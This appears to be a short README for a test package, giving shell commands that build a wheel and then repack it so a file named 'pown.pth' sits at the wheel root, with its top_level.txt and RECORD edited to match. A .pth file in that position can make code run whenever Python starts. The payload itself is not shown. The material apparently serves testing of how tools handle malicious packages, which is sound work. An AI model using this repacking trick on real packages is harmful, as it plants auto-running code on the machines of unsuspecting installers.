create a package that installs a malicious `.pth` file.

build via
```shell
rm -rf dist build src/d_with_malicious_pth.egg-info.egg-info
python -m build --wheel

cd dist
rm -rf manip_build
unzip  d_with_malicious_pth-0.0.1-py3-none-any.whl -d manip_build
rm     d_with_malicious_pth-0.0.1-py3-none-any.whl

cd manip_build
mv   module_d/pown.pth .
echo pown.pth >> d_with_malicious_pth-0.0.1.dist-info/top_level.txt
sed -i 's#module_d/pown.pth#pown.pth#g' d_with_malicious_pth-0.0.1.dist-info/RECORD

zip  ../d_with_malicious_pth-0.0.1-py3-none-any.whl -r .
cd ..
rm -rf manip_build
cd ..
```
